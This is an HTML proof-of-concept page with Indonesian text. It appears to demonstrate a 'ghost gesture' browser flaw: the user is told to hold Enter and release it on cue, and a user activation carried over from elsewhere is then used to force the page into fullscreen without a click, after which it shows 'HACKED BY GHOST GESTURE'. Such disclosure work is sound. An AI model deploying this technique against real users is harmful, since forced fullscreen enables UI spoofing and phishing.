<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B (Fullscreen)</title>
    <style>
        body {
            font-family: monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: white;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div id="timer">2s...</div>
    <div id="status">Tahan "Enter" lalu lepas di 1s</div>

    <script>
        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                if (navigator.userActivation.isActive) {
                    try {
                        await document.documentElement.requestFullscreen();

                        document.body.innerHTML = `
                            <h1 style="color:red;">HACKED BY GHOST GESTURE</h1>
                            <p>Layar Anda berhasil dipaksa masuk Fullscreen tanpa klik di halaman ini!</p>
                            <button onclick="document.exitFullscreen()">Keluar</button>
                        `;
                    } catch (err) {
                        console.log("Fullscreen failed:", err);
                        alert("Ghost Gesture Terdeteksi Aktif, tapi Fullscreen diblokir Sandbox: " + err.name);
                    }
                } else {
                    alert("Gagal: User Activation tidak terbawa.");
                }
            }
        });
    </script>
</body>

</html>
